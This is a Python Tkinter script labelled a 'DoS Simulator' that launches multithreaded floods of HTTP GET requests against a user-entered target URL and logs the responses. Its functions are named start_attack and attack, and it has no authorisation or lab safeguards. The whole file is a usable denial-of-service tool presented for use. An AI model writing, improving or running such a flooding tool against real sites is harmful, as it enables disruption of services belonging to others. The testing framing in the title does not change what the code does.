import tkinter as tk
from tkinter import messagebox, filedialog
import threading
import requests
import time
import datetime
from tkinter import ttk

log_data = []
stop_attack = False

def start_attack():
    global stop_attack
    stop_attack = False

    try:
        url = entry_url.get()
        threads = int(entry_threads.get())
        delay = float(entry_delay.get())
        total = int(entry_total.get())

        if not url.startswith("http"):
            url = "http://" + url

        btn_start.config(state=tk.DISABLED)
        btn_stop.config(state=tk.NORMAL)

        success_count = [0]
        fail_count = [0]
        completed_threads = [0]

        def attack():
            nonlocal url, delay, total
            local_success = 0
            local_fail = 0
            for i in range(total):
                if stop_attack:
                    break
                try:
                    res = requests.get(url, timeout=5)
                    msg = f"[{res.status_code}] -> {url}"
                    log.insert(tk.END, msg + "\n", "success")
                    log_data.append(msg)
                    log.yview_moveto(1.0)
                    local_success += 1
                except Exception as e:
                    err = f"[ERROR] -> {str(e)}"
                    log.insert(tk.END, err + "\n", "error")
                    log_data.append(err)
                    log.yview_moveto(1.0)
                    local_fail += 1
                time.sleep(delay)

            success_count[0] += local_success
            fail_count[0] += local_fail
            completed_threads[0] += 1
            if completed_threads[0] == threads:
                sent_total = success_count[0] + fail_count[0]
                btn_start.config(state=tk.NORMAL)
                btn_stop.config(state=tk.DISABLED)
                messagebox.showinfo("Done", f"Finished!\n📤 Sent: {sent_total}\n✅ Success: {success_count[0]}\n❌ Failed: {fail_count[0]}")

        for _ in range(threads):
            threading.Thread(target=attack).start()

    except Exception as e:
        messagebox.showerror("Error", str(e))
        btn_start.config(state=tk.NORMAL)
        btn_stop.config(state=tk.DISABLED)

def stop_attack_func():
    global stop_attack
    stop_attack = True
    btn_start.config(state=tk.NORMAL)
    btn_stop.config(state=tk.DISABLED)

def save_log():
    if not log_data:
        messagebox.showwarning("Warning", "No logs to save.")
        return
    now = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    default_filename = f"log_{now}.txt"
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", initialfile=default_filename)
    if file_path:
        with open(file_path, "w") as f:
            for line in log_data:
                f.write(line + "\n")
        messagebox.showinfo("Saved", f"Log saved to {file_path}")

def clear_log():
    log.delete(1.0, tk.END)
    log_data.clear()

# GUI setup eka
root = tk.Tk()
root.title("DoS Simulator by [Dilshan]")
root.geometry("520x500")
root.configure(bg="black")

#Header label 
header = tk.Label(root, text="🛡 Dos simulator Created by #Dilshan",
                font=("Helvetica", 14,"bold"), bg="black", fg="#D3D3D3")
header.pack(pady=10)

# scrollbar ekee style tika
style = ttk.Style()
style.theme_use("default")
style.configure("Purple.Vertical.TScrollbar",
                gripcount=0,
                background="#800080",
                darkcolor="#800080",
                lightcolor="#800080",
                troughcolor="#1e1e1e",
                bordercolor="#1e1e1e",
                arrowcolor="white")

# Labels & Inputs
def add_label(text):
    tk.Label(root, text=text, bg="black", fg="white").pack()

add_label("🎯 Target URL:")
entry_url = tk.Entry(root, width=60, bg="#222", fg="white", insertbackground="white")
entry_url.pack()

add_label("🧵 Threads:")
entry_threads = tk.Entry(root, bg="#222", fg="white", insertbackground="white")
entry_threads.insert(0, "5")
entry_threads.pack()

add_label("⏱️ Delay between requests (seconds):")
entry_delay = tk.Entry(root, bg="#222", fg="white", insertbackground="white")
entry_delay.insert(0, "0.5")
entry_delay.pack()

add_label("🔁 Total Requests per Thread:")
entry_total = tk.Entry(root, bg="#222", fg="white", insertbackground="white")
entry_total.insert(0, "10")
entry_total.pack()

btn_start = tk.Button(root, text="🚀 Start Simulation", command=start_attack, bg="#4CAF50", fg="white")
btn_start.pack(pady=5)

btn_stop = tk.Button(root, text="🛑 Stop", command=stop_attack_func, state=tk.DISABLED, bg="#f44336", fg="white")
btn_stop.pack(pady=5)

btn_save = tk.Button(root, text="💾 Save Log", command=save_log, bg="#555", fg="white")
btn_save.pack(pady=5)

btn_clear = tk.Button(root, text="🧹 Clear Log", command=clear_log, bg="#555", fg="white")
btn_clear.pack(pady=5)

# Log area with dam paata scrollbar <3
log_frame = tk.Frame(root, bg="black")
log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

scrollbar = ttk.Scrollbar(log_frame, orient="vertical", command=lambda *args: log.yview(*args), style="Purple.Vertical.TScrollbar")
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

log = tk.Text(log_frame, height=12, yscrollcommand=scrollbar.set, bg="#1e1e1e", fg="white", insertbackground='white')
log.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
scrollbar.config(command=log.yview)

# Color tag styles
log.tag_config("success", foreground="#00FF00")
log.tag_config("error", foreground="#FF4444")

root.mainloop()

# End of script | Iwarai yko thawa nh :(